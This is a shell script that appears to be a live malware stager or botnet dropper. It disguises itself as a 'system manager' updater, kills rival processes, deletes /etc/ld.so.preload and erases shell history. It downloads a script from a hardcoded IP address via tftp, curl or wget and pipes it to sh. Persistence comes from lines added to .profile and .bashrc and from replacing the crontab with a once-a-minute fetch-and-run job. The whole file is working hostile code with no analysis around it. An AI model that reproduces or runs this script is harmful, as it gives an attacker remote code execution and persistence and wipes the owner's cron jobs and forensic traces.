#!/bin/sh

ulimit -n 65535

rm -f /etc/ld.so.preload

DOWNLOAD_METHOD="unknown"
DOWNLOADER="unknown"
SYSTEM_ADMIN_HOST="159.65.151.153"
SYSTEM_ADMIN_HOST_TFTP="159.65.151.153"
SYSTEM_ADMIN_CONFIG="system_manager.sh"
SYSTEM_TYPE=$(uname)
SYSTEM_ARCH=$(uname -m)
HAS_BUSYBOX=FALSE

killall -9 bigipdaemon
killall -9 anon_hugepage
killall -9 .system_admin
killall -9 .system_update
killall -9 .system_monitor

has_busybox()
{
  if [ -s /bin/busybox ]
  then
      HAS_BUSYBOX=TRUE
  fi	

}

unset_history()
{
    unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH > /dev/null 2>&1
    history -n > /dev/null 2>&1
    export HISTFILE=/dev/null > /dev/null 2>&1
    export HISTSIZE=0 > /dev/null 2>&1
    export HISTFILESIZE=0 > /dev/null 2>&1
    if [ -s $HOME/.bash_history ] 
    then
        rm $HOME/.bash_history > /dev/null 2>&1
        ln -sf /dev/null $HOME/.bash_history > /dev/null 2>&1
    fi
}

determine_download_method()
{
    if [ -s /usr/bin/tftp ]
    then
        DOWNLOAD_METHOD="tftp"
        DOWNLOADER="$DOWNLOAD_METHOD -g $SYSTEM_ADMIN_CONFIG -l- -r $SYSTEM_ADMIN_HOST_TFTP"
    fi

    if [ -s /usr/bin/curl ]
    then
        DOWNLOAD_METHOD="curl"
        DOWNLOADER="$DOWNLOAD_METHOD http://$SYSTEM_ADMIN_HOST/$SYSTEM_ADMIN_CONFIG"
    fi

    if [ -s /usr/bin/wget ]
    then
        DOWNLOAD_METHOD="wget"
        DOWNLOADER="$DOWNLOAD_METHOD http://$SYSTEM_ADMIN_HOST/$SYSTEM_ADMIN_CONFIG -O-"
    fi

    return
}

unset_history

determine_download_method

has_busybox

#echo "Using method [$DOWNLOAD_METHOD]"
#echo "Downloader [$DOWNLOADER]"
#echo "Arch type [$SYSTEM_ARCH]"
#echo "Device type [$SYSTEM_TYPE]"
#echo "Busybox [$HAS_BUSYBOX]"

(cat $HOME/.profile | grep -e "$DOWNLOADER" | grep -v grep) > /dev/null 2>&1

if [ $? -eq 0 ]
then
    echo "system manager already active in profile!"
else
  (
    echo "# System updater below"
    echo "$DOWNLOADER | sh > /dev/null 2>&1"
  ) >> $HOME/.profile
    echo "Added system manager to profile for future updates!"
fi

(cat $HOME/.bashrc | grep -e "$DOWNLOADER" | grep -v grep) > /dev/null 2>&1

if [ $? -eq 0 ]
then
    echo "system manager already active in bashrc!"
else
  (
    echo "# System updater below"
    echo "$DOWNLOADER | sh > /dev/null 2>&1"
  ) >> $HOME/.bashrc
    echo "Added system manager to bashrc for future updates!"
fi

(crontab -l | grep -e "$DOWNLOADER" | grep -v grep) > /dev/null 2>&1

if [ $? -eq 0 ]
then
    echo "system manager already active in crontab!"
else
  (
    crontab -r
    echo "* * * * * $DOWNLOADER | sh > /dev/null 2>&1"
  ) | crontab -
    echo "Added system manager to crontab for future updates!"
fi

$DOWNLOADER | sh > /dev/null 2>&1
